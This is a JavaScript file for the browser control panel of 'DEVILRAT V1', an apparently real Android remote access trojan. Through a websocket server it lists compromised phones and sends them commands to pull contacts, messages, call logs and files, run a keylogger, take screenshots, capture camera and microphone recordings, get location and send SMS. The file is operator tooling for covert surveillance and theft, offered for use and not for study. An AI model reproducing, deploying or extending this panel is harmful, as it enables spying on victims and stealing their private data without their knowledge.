class DevilRatPanel {
    constructor() {
        this.socket = null;
        this.devices = [];
        this.commands = [];
        this.logs = [];
        this.selectedDevice = null;
        this.init();
    }

    init() {
        this.connectWebSocket();
        this.loadDevices();
        this.setupEventListeners();
        this.addLog('system', 'DEVILRAT V1 Panel initialized', 'success');
        this.updateStats();
    }

    connectWebSocket() {
        // Get current host (works for Koyeb deployment)
        const host = window.location.host;
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${host}`;
        
        this.socket = io(wsUrl, {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            reconnectionAttempts: Infinity
        });

        this.socket.on('connect', () => {
            this.updateConnectionStatus('🟢 CONNECTED');
            this.addLog('system', 'Connected to DEVILRAT server', 'success');
        });

        this.socket.on('device_update', (device) => {
            this.updateDevice(device);
        });

        this.socket.on('device_connected', (device) => {
            this.addDevice(device);
            this.addLog('device', `New device connected: ${device.model}`, 'success');
        });

        this.socket.on('command_completed', (command) => {
            this.addLog('command', `Command completed: ${command.command}`, 'success');
        });

        this.socket.on('disconnect', () => {
            this.updateConnectionStatus('🔴 DISCONNECTED');
            this.addLog('system', 'Disconnected from server', 'error');
        });
    }

    async loadDevices() {
        try {
            const response = await fetch('/api/devices');
            this.devices = await response.json();
            this.renderDevices();
            this.updateStats();
        } catch (error) {
            this.addLog('system', `Failed to load devices: ${error.message}`, 'error');
        }
    }

    renderDevices() {
        const deviceList = document.getElementById('deviceList');
        
        if (this.devices.length === 0) {
            deviceList.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-ghost"></i>
                    <p>No devices connected</p>
                    <p class="small-text">Waiting for devices to connect...</p>
                </div>
            `;
            return;
        }

        deviceList.innerHTML = '';
        
        this.devices.forEach(device => {
            const isOnline = device.isOnline || device.status === 'online';
            const card = document.createElement('div');
            card.className = `device-card ${isOnline ? 'online' : 'offline'}`;
            card.innerHTML = `
                <div class="device-header">
                    <div class="device-model">${device.model}</div>
                    <div class="device-status ${isOnline ? 'online' : 'offline'}">
                        ${isOnline ? 'ONLINE' : 'OFFLINE'}
                    </div>
                </div>
                <div class="device-info">
                    <div><i class="fas fa-battery-full"></i> ${device.battery}</div>
                    <div><i class="fab fa-android"></i> ${device.android}</div>
                    <div><i class="fas fa-wifi"></i> ${device.ip}</div>
                    <div><i class="fas fa-clock"></i> ${new Date(device.connectedAt).toLocaleTimeString()}</div>
                </div>
                <div class="device-actions">
                    <button class="btn-small" onclick="dev.selectDevice('${device.id}')">
                        <i class="fas fa-crosshairs"></i> SELECT
                    </button>
                    <button class="btn-small" onclick="dev.showDeviceCommands('${device.id}')">
                        <i class="fas fa-terminal"></i> COMMANDS
                    </button>
                </div>
            `;
            deviceList.appendChild(card);
        });
    }

    addDevice(device) {
        const existingIndex = this.devices.findIndex(d => d.id === device.id);
        if (existingIndex >= 0) {
            this.devices[existingIndex] = device;
        } else {
            this.devices.push(device);
        }
        this.renderDevices();
        this.updateStats();
    }

    updateDevice(device) {
        const index = this.devices.findIndex(d => d.id === device.id);
        if (index >= 0) {
            this.devices[index] = { ...this.devices[index], ...device };
            this.renderDevices();
        }
    }

    selectDevice(deviceId) {
        this.selectedDevice = deviceId;
        const device = this.devices.find(d => d.id === deviceId);
        this.addLog('device', `Selected device: ${device.model}`, 'info');
        
        // Highlight selected device
        document.querySelectorAll('.device-card').forEach(card => {
            card.classList.remove('selected');
        });
        event.target.closest('.device-card').classList.add('selected');
        
        this.showCommandModal('quick');
    }

    showCommandModal(type) {
        if (!this.selectedDevice) {
            this.showDeviceSelection();
            return;
        }

        const modal = document.getElementById('commandModal');
        const modalBody = document.getElementById('modalBody');
        const device = this.devices.find(d => d.id === this.selectedDevice);

        let content = '';
        let title = '';

        switch(type) {
            case 'sms':
                title = '📱 SEND SMS';
                content = `
                    <div class="input-group">
                        <label class="input-label">Phone Number:</label>
                        <input type="text" class="input-field" id="smsNumber" placeholder="+628123456789">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Message:</label>
                        <textarea class="textarea-field" id="smsMessage" placeholder="Type your message..."></textarea>
                    </div>
                    <button class="btn-execute" onclick="dev.sendSMS()">
                        <i class="fas fa-paper-plane"></i> SEND SMS
                    </button>
                `;
                break;

            case 'location':
                title = '📍 GET LOCATION';
                content = `
                    <p>Get current location from <strong>${device.model}</strong></p>
                    <button class="btn-execute" onclick="dev.executeCommand('location')">
                        <i class="fas fa-map-marker-alt"></i> GET LOCATION
                    </button>
                `;
                break;

            case 'camera':
                title = '📸 CAMERA CONTROL';
                content = `
                    <div class="input-group">
                        <label class="input-label">Duration (seconds):</label>
                        <input type="number" class="input-field" id="cameraDuration" value="10" min="1" max="60">
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                        <button class="btn-execute" onclick="dev.executeCommand('camera_front')">
                            <i class="fas fa-camera"></i> FRONT
                        </button>
                        <button class="btn-execute" onclick="dev.executeCommand('camera_back')">
                            <i class="fas fa-camera"></i> BACK
                        </button>
                    </div>
                `;
                break;

            case 'mic':
                title = '🎤 MICROPHONE';
                content = `
                    <div class="input-group">
                        <label class="input-label">Duration (seconds):</label>
                        <input type="number" class="input-field" id="micDuration" value="30" min="1" max="300">
                    </div>
                    <button class="btn-execute" onclick="dev.executeCommand('microphone')">
                        <i class="fas fa-microphone"></i> START RECORDING
                    </button>
                `;
                break;

            case 'quick':
                title = '⚡ QUICK COMMANDS';
                content = `
                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                        <button class="action-btn contacts" onclick="dev.executeCommand('contacts')">
                            <i class="fas fa-address-book"></i> CONTACTS
                        </button>
                        <button class="action-btn messages" onclick="dev.executeCommand('messages')">
                            <i class="fas fa-comment-alt"></i> MESSAGES
                        </button>
                        <button class="action-btn" onclick="dev.executeCommand('calls')">
                            <i class="fas fa-phone"></i> CALLS
                        </button>
                        <button class="action-btn" onclick="dev.executeCommand('files')">
                            <i class="fas fa-folder"></i> FILES
                        </button>
                        <button class="action-btn" onclick="dev.executeCommand('screenshot')">
                            <i class="fas fa-camera-retro"></i> SCREENSHOT
                        </button>
                        <button class="action-btn" onclick="dev.executeCommand('keylogger')">
                            <i class="fas fa-keyboard"></i> KEYLOGGER
                        </button>
                        <button class="action-btn vibrate" onclick="dev.executeCommand('vibrate')">
                            <i class="fas fa-vibrate"></i> VIBRATE
                        </button>
                        <button class="action-btn" onclick="dev.showCommandModal('toast')">
                            <i class="fas fa-bell"></i> TOAST
                        </button>
                    </div>
                `;
                break;

            default:
                title = type.toUpperCase();
                content = `<p>Execute ${type} on ${device.model}</p>`;
        }

        document.getElementById('modalTitle').textContent = title;
        modalBody.innerHTML = content;
        modal.style.display = 'flex';
    }

    showDeviceSelection() {
        const modal = document.getElementById('deviceModal');
        const list = document.getElementById('deviceSelectList');
        
        list.innerHTML = '';
        
        this.devices.forEach(device => {
            const btn = document.createElement('button');
            btn.className = 'device-select-btn';
            btn.innerHTML = `
                <div style="font-weight: bold;">${device.model}</div>
                <div style="font-size: 0.9em; color: #888;">${device.id}</div>
                <div style="font-size: 0.8em;">Status: <span class="${device.status === 'online' ? 'online' : 'offline'}">${device.status.toUpperCase()}</span></div>
            `;
            btn.onclick = () => {
                this.selectedDevice = device.id;
                this.closeDeviceModal();
                this.addLog('system', `Selected device: ${device.model}`, 'success');
                this.showCommandModal('quick');
            };
            list.appendChild(btn);
        });

        modal.style.display = 'flex';
    }

    async sendSMS() {
        const number = document.getElementById('smsNumber').value;
        const message = document.getElementById('smsMessage').value;
        
        if (!number || !message) {
            this.addLog('command', 'SMS failed: Phone number and message required', 'error');
            return;
        }

        await this.executeCommand('sms', { number, message });
        this.closeModal();
    }

    async executeCommand(command, params = {}) {
        if (!this.selectedDevice) {
            this.addLog('command', 'No device selected', 'error');
            this.showDeviceSelection();
            return;
        }

        // Get additional params from inputs
        if (command === 'microphone') {
            params.duration = parseInt(document.getElementById('micDuration')?.value) || 30;
        }
        if (command.includes('camera')) {
            params.duration = parseInt(document.getElementById('cameraDuration')?.value) || 10;
        }

        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    deviceId: this.selectedDevice,
                    command: command,
                    params: params
                })
            });

            const result = await response.json();
            
            if (result.status === 'sent') {
                this.commands.push({
                    id: result.commandId,
                    deviceId: this.selectedDevice,
                    command: command,
                    timestamp: new Date().toISOString()
                });
                
                this.addLog('command', `Sent: ${command} to device`, 'success');
                this.updateStats();
                
                // If using WebSocket, also send via socket
                if (this.socket && this.socket.connected) {
                    const device = this.devices.find(d => d.id === this.selectedDevice);
                    if (device && device.socketId) {
                        this.socket.emit('send_command', {
                            deviceId: this.selectedDevice,
                            command: command,
                            params: params
                        });
                    }
                }
            } else {
                this.addLog('command', `Failed: ${command}`, 'error');
            }
        } catch (error) {
            this.addLog('command', `Error: ${error.message}`, 'error');
        }
    }

    addLog(source, message, type = 'info') {
        const log = {
            timestamp: new Date().toLocaleTimeString(),
            source: source,
            message: message,
            type: type
        };

        this.logs.unshift(log);
        if (this.logs.length > 50) this.logs.pop();

        this.renderLogs();
        this.updateStats();
    }

    renderLogs() {
        const logList = document.getElementById('logList');
        logList.innerHTML = '';

        this.logs.forEach(log => {
            const logItem = document.createElement('div');
            logItem.className = `log-item ${log.type}`;
            logItem.innerHTML = `
                <div class="log-time">[${log.timestamp}] ${log.source.toUpperCase()}</div>
                <div class="log-message">${log.message}</div>
            `;
            logList.appendChild(logItem);
        });
    }

    clearLogs() {
        this.logs = [];
        this.renderLogs();
        this.addLog('system', 'Logs cleared', 'info');
    }

    updateStats() {
        const onlineCount = this.devices.filter(d => d.status === 'online' || d.isOnline).length;
        
        document.getElementById('totalDevices').textContent = this.devices.length;
        document.getElementById('onlineCount').textContent = onlineCount;
        document.getElementById('activeCommands').textContent = this.commands.length;
        document.getElementById('totalLogs').textContent = this.logs.length;
        
        // Update nav badge
        document.getElementById('onlineCount').previousElementSibling.textContent = onlineCount;
    }

    updateConnectionStatus(status) {
        const statusEl = document.getElementById('connectionStatus');
        statusEl.innerHTML = `<i class="fas fa-wifi"></i> <span>${status}</span>`;
        
        if (status.includes('CONNECTED')) {
            statusEl.style.background = 'rgba(0, 100, 0, 0.3)';
            statusEl.style.borderColor = '#00ff00';
        } else {
            statusEl.style.background = 'rgba(100, 0, 0, 0.3)';
            statusEl.style.borderColor = '#ff0000';
        }
    }

    setupEventListeners() {
        window.addEventListener('click', (e) => {
            if (e.target.classList.contains('modal')) {
                this.closeModal();
                this.closeDeviceModal();
            }
        });
    }

    closeModal() {
        document.getElementById('commandModal').style.display = 'none';
    }

    closeDeviceModal() {
        document.getElementById('deviceModal').style.display = 'none';
    }

    showSection(section) {
        // Implement section switching if needed
        console.log(`Show section: ${section}`);
    }

    showSettings() {
        alert('DEVILRAT V1 Settings\n\nVersion: 1.0.0\nDeployment: Koyeb\nStatus: Operational\n\n👹 KEGELAPAN ABADI 🛐');
    }
}

// Initialize
let dev;
document.addEventListener('DOMContentLoaded', () => {
    dev = new DevilRatPanel();
    window.dev = dev; // Expose to global for button onclick
});

// Global functions for HTML onclick
function loadDevices() { dev?.loadDevices(); }
function clearLogs() { dev?.clearLogs(); }
function showCommandModal(type) { dev?.showCommandModal(type); }
function executeCommand(command) { dev?.executeCommand(command); }
function closeModal() { dev?.closeModal(); }
function closeDeviceModal() { dev?.closeDeviceModal(); }
function showSettings() { dev?.showSettings(); }
